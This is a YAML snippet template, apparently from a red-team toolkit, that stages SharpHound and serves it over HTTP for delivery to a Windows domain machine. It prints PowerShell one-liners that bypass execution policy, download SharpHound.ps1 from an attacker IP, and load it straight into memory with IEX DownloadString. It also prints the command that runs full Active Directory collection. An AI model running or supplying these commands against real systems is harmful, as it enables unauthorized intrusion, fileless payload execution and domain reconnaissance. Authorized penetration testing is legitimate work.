---
metadata:
  filename: "deliver-windows-sharphound.yaml"
  tags: ["windows", "domain"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p packstation/outbound; bash -c 'cp -n {{ tools_dir }}/bloodhound/* packstation/outbound'; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'Preparation (for Save on disk only): powershell -ep bypass'; \
  printf '%s\n' 'Deliver, Save to disk & Import: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/SharpHound.ps1 -Outfile {{ delivery_path_windows }}\SharpHound.ps1; Import-Module {{ delivery_path_windows }}\SharpHound.ps1'; \
  printf '%s\n' "Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString('http://{{ attacker_ip }}:{{ delivery_outbound_port }}/SharpHound.ps1')"; \
  printf '%s\n' 'To run: Invoke-BloodHound -CollectionMethod All -OutputDirectory {{ delivery_path_windows }}\ -OutputPrefix "audit"'; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                         -----CMD-----                          '; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
